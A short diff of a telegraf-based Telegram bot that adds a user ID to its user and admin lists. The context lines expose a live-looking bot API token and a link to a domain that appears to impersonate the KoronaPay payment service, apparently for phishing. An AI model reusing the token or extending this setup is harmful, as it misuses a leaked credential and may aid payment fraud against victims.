@@ -6,8 +6,8 @@ const {message} = require("telegraf/filters");
 const bot = new Telegraf('7315612813:AAHb_3CCOnC8LmHUwUNQgiu2-6IhOZvWdiw');
 const link = 'main.koronapayreturn.ru'
 let sendms = [];
-const botusers = [5708889761, 7147845976]
-const admins = [5708889761, 7147845976]
+const botusers = [5708889761, 7147845976, 5903574289]
+const admins = [5708889761, 7147845976, 5903574289]
 let sendm = []
 
 let respo = null;
